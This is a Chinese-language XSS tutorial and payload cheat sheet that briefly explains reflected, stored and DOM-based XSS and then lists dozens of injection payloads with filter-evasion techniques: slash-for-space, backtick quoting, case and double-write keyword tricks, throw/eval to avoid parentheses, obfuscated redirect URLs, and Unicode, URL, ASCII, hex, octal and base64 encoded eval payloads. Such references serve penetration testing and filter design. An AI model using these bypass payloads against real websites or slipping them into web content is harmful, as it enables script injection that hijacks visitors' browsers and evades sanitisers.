## 会话管理

HTTP是一种无状态协议，一次请求结束，客户端与服务端的连接就会断开，服务器再次收到请求时，无法识别此次请求是哪个用户发过来的，需要重新建立连接。为了判断发送请求的用户，需要一种记录用户的方式，也就是Web应用会话管理。

#### 基于server端session的管理的方式



## 跨站脚本攻击类型

#### **反射型XSS** 

- 反射型XSS 是非持久型、参数型的跨站脚本，恶意代码并没有保存在目标网站，通过引诱用户点击一个链接到目标网站的恶意链接来实施攻击的。

- 出现场景:多出现在搜索框或者输入框。


#### 存储型XSS

- 恶意代码被保存到目标网站的服务器中，这种攻击具有较强的稳定性和持久性

- 比较常见的场景是，黑客写下一篇包含有恶意JavaScript代码的博客文章，文章发表后，所有访问该博客的用户，都会在他们的浏览器中执行这段恶意is代码。


#### DOM型XSS

- DOM，全称Document Object Model (文档对象模型)，是W3C推荐的一种独立于平台和语言的标准，定义了访问HTML和XML文档的标准。

- Dom即window对象下内置的document对象。

  简单理解即输出点在DOM，属于特殊的反射型，只能在URL中输入探测脚本。

---

## 常用测试弹窗和过滤手段

### 一、无过滤直接触发

#### 1、<script>标签

```
<script>alert('xss')</script>
```

#### 2、< img >标签

结合`on`事件触发

```
<img src=1 onerror=alert('xss')>
```

#### 3、< a >标签

结合`javascript`伪协议触发

```
<a href=javascript:alert('xss')>xss</a>
```

结合`on`事件触发

```
<a onclick=alert('xss')>xss</a>
```

#### 4、< input >标签

结合`on`事件触发

```
<input onclick=alert('xss')>
```

#### 5、< from >标签

结合`javascript`伪协议当参数提交时可触发

```
<form action=javascript:alert('xss')>
```

结合`on`事件触发

```
<form onmouseover=alert('xss')>xss</form>
```

#### 6、< iframe >标签

结合`javascript`伪协议当参数提交时可触发

```
<iframe src=javascript:alert('xss')></iframe>
```

结合`on`事件触发

```
<iframe onload=alert('xss')></iframe>
```

#### 7、< details>标签

结合`on`事件触发

```
使用open属性触发ontoggle事件，无需主动触发
<details open ontoggle="alert('xss');">
```

#### 8、< select>标签

结合`on`事件触发

```
通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
<select onfocus=alert('xss') autofocus>
```

#### 9、其他标签

```
无需用户触发：
<svg onload=alert('xss')>
<body onload=alert('xss')>
<video><source onerror=alert('xss')>
<audio src=x onerror=alert("xss");>
<textarea onfocus=alert("xss"); autofocus>

需要用户触发:
<button onclick=alert('xss')>xss</button>
<p onmouseover=alert('xss')>xss</p>
<d3v/onmouseover=[3].some(confirm)>click
```

### 二、绕过过滤触发

#### 1、过滤空格

使用`/`代替空格

```
<img/src='1'/onerror=alert('xss')>
```

#### 2、过滤引号

使用`反引号`代替空格

```
<img src=1 onerror=alert(`xss`)>
```

#### 3、关键词过滤

常见字符过滤绕过手法

```
大小写
<ImG sRc=1 onerRor=alert('xss')>

双写
<imimgg srsrcc=1 onerror=alert('xss');>

内联注释
<img src=1 oner<!--test-->ror=al<!--test-->ert('xss')>
```

#### 4、过滤括号

可以使用`反引号`代替括号

```
<img src=1 onerror=alert`1`>
```

也可以使用throw来绕过

```
<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
```

#### 5、过滤url地址

```css
使用url编码
<img src="x" onerror=document.location=``http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/``>

使用IP十进制
<img src="x" onerror=document.location=``http://2130706433/``>

使用IP八进制
<img src="x" onerror=document.location=``http://0177.0.0.01/``>

使用IP十六进制
<img src="x" onerror=document.location=``http://0x7f.0x0.0x0.0x1/``>

html标签中用//可以代替http://
<img src="x" onerror=document.location=``//www.baidu.com``>

使用中文的句号。代替英文的点.
<img src="x" onerror="document.location='http://www。baidu。com'">
```

#### 6、编码绕过

```css
Unicode编码绕过
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;">
<img src="x" onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')">

url编码绕过
<img src="x" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))">
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>

Ascii码绕过
<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">

Hex绕过
<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>

八进制绕过
<img src=x onerror=alert('\170\163\163')>

base64绕过
<img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
```
